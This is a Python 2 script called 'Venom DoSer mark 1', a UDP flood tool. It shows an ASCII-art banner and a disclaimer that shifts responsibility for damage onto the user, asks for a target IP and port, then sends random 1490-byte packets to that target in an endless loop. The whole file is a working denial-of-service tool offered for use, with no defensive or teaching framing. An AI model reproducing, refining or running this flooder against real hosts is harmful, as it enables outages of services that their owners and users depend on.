#venom doser project 1
import time
import socket
import random
import os
from datetime import datetime
now = datetime.now()
minute = now.minute
hour = now.hour
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)



print("""

		    `-+sydmNNmdhs+:`                                          ./oydmMMMMMNmdho/.           
		  .+hNMMMMMMMMMMMMMMMmy/.                                  ./ymMMMMMMMMMMMMMMMMMMd/         
		.sNMMMMMMMMMMMMMyysooshdNdo.                            .odmdyo++syyMMMMMMMMMMMMMMMd-       
	       +NMMMMMMMMMMMMMMMMMMNmy+-`.:/`                          -/:..:ohNMMMMMMMMMMMMMMMMMMMMNo      
	     `yMMMMMMMMMMMMMMMMMMMMMMMMNms:`                            .+hNMMMMMMMMMMMMMMMMMMMMMMMMMMy`    
	    `yMMMNNmdhhhhdmNMMMMMMMMMMMMMMMms:                       `/hNMMMMMMMMMMMMMMMNNmdhhhddmNNMMMd-   
	    :so/-.```   ```.-/ohmMMMMMMMMMMMMMd+`                  `omMMMMMMMMMMMMMNhs+-.```   ````.-/+ss.  
		                `:odMMMMMMMMMMMMm:                .dMMMMMMMMMMMNdo:.`                       
		                   `-odMMMMMMMMMNy                sNMMMMMMMMMh+.`                           
		                      `:hNMMMMM:.`                `.:MMMMMNs-`                              
		                         -sNMMMy                    hMMMNs.                                 
		         `.-:///- ..`      -yMMM/                  /MMMy-     `... -///:--`                 
		      .+ymmNmmdd/ +hhhyo/-`  /dMm`                .NMd: `-/shdddh+ /hhdddmmh+.              
		    -yNNdyooosyyysssssoshmmy/``sNo ``          `` sm/`.+dNmdhyyyyysysso+//+yNNs.            
	  +.      `omdsohmNMMMMMMMMMMMMNddMMMd- -+ y/          :h /` :mMNsydNMMMMMMMMMMMMNds+sNm+`      .-  
	  -y/.``./dMhomMMMMMMMMMMMMMMMMMMMMMMMm`   d+          +m`  `NMMMNMMMMMMMMMMMMMMMMMMNh+mMh:.``.os`  
	   .hmddmMMMh/oyhmmNNMMMMMMMMMMNNNMMMMN-  `mo          sm`  `mMMMMNNNMMMMMMMMMMMMMNmds/mMMMmddNy.   
	 `/ssmNmmmmNMNhyoo++++ooo+ssssyyhhMNdo.   .My          hM.   -hNMNhhyyysyysyhhhyssooshNMNmmmmNmhs/. 
	`+so/--..`..:ohmNNMMNNNm+ smmmmmhs+-`     /Mm          mMo     ./shmmNNmms +mmNNNNNNmho:-.``.-:+ss+`
	/o-            `.-:/+++o: .--.``         `dMm          mMm`        ``.---. :o+++/:-.`            -+/
	`                                        +MMm          mMMo                                        `
		                                :NMMh          dMMN:                                        
		                               -NMMMs          yMMMN-                                       
		                              /NMMMMo          oMMMMm:                                      
		                            `oNMNMMM/          /MMMNMNo`                                    
		                           -hMmo-hMM:          -NMh-smMd-                                   
		                         `+NN+`  dMN.          `NMm  `+mN+                                  
		                   .+s/ `yNo`   `MMm`           NMM`   `oNs `++:`                           
	 `y-                   `-odNMNs +d.     .MMo            dMM.     -m+`oNMNh+.                    ./  
	  yMd+.           .:+sdNMMNh+.  so      .MM:            hMM`      sh  `+hNMMmy+:`           .:sdM/  
	  .NMMMNdysosshdmMMMmdy+:.      -s`      dMy`           hMy      `y.      .:oydmMNdhysssyhdNMMMMh   
	   /MMMN+oNMMMMs:-.                  smdo-hMNy+:::::/ohNMy:sdmo                  .-:sMMMMNo/NMMM-   
	    sMMMm.-mMMMMs`                   `oyds`-+shdmmmmmdy+-`ddyo`                   `oNMMMm:`dMMMo    
	    `yMMMh`.hMMMMd-                      /NNdhs+/::/oshdNN/                      :dMMMMh.`hMMMh`    
	     `hMMMy `oNMMMNo`                  .yMMMMMMMMMMMMMMMMMMs`                  `yMMMMMs``yMMMh`     
	      `yMMMo  /NMMMMm/               .oNMMMMMMMMNhhNMMMMMMMMm+.               /mMMMMN+ `sMMMh.      
	       `yMMMy` -dMMMMMh-....----:/+sdNMMMMMMMMNs.  .sMMMMMMMMMNdso+//:----..-yMMMMMm- `sMMMh`       
		`sMMMd- `sMMMMMNNNNNNNNNMMMMMMMMMMMMMd:      /mMMMMMMMMMMMMMMMNNNNNNNMMMMMy. .hMMMs`        
		  +NMMNo` :dMMMMMMMMMMMMMMMMMMMMMMMNs`        .yMMMMMMMMMMMMMMMMMMMMMMMMd/  /mMMNo`         
		   /NMMMd/``:ohdmmmmmmmmmmmmmmNMMMN/           `+NMMMNmmmmmmmmmmmmmmdho:``:hMMMN/           
		    -dMMMhy/`  `````````````/ydNMMNhhhhhhhhhhhhhhNMMNmy/`````````````  .+ysNMMd-            
		     `sMMh-/s+-              `...-::////+++++///::-...`             .:ss:.hMNs`             
		       +mMd. -+o/:.`                                            .-+ss+. .hMd:               
		        -hMm-  `.-:::-                                        -:/:-.   -mNs`                
		         `+mN+                      ````````````                      /Nd:                  
		           .sNs`                   `sddddddddddy`                   `oms`                   
		             -hh-                   .yMMMMMMMMy.                   .yy-                     
		              `/h/`                  `mMMMMMMd`                  `/y/                       
		                .++`                 `mMMMMMMh                  `+/`                        
		                  .`                 -MMMMMMMN.                 ``                          
		                                     sMMMMMMMM/                                             
		                                    `mMMMMMMMMh                                             
		                                    `NMMMMMMMMm`                                            
		                                    `dMMMMMMMMd`                                            
		                                     hMMMMMMMMy                                             
		                                     +MMMMMMMM/                                             
		                                     -MMMMMMMN.                                             
		                                     `hMMMMMMh                                              
		                                      /MMMMMM+                                              
		                                      `hMMMMm`                                              
		                                       .mMMm- 

			
			                     -oOo- Venom DoSer mark 1 -oOo-  
					    -oOo Developed by venom0x16 -oOo-
		-oOo- Resbonsibility for damage you'll cause is all yours.Using this tool means you are accepting. -oOo-


""")

x = raw_input("Do you wish packet amount increase in every sent? y/n : ")

if x == "y":	
	target = raw_input("Target IP: ")
	port = int(input("Port: "))
	packet = int(input("Amount of packet for start: "))
	while True:
     		sock.sendto(bytes, (target,port))
     		packet = packet + 1
		port = port
     		print "Sent %s packet to %s throught port %s"%(packet,target,port)	

     		

if x == "n":
	target = raw_input("Target IP: ")
	port = int(input("Port: "))
	packet = int(input("Amount of packet: "))
	while True:
		sock.sendto(bytes, (target,port))
		packet = packet
		port = port
		print "Sent %s packet to %s throught port %s"%(packet,target,port)


	
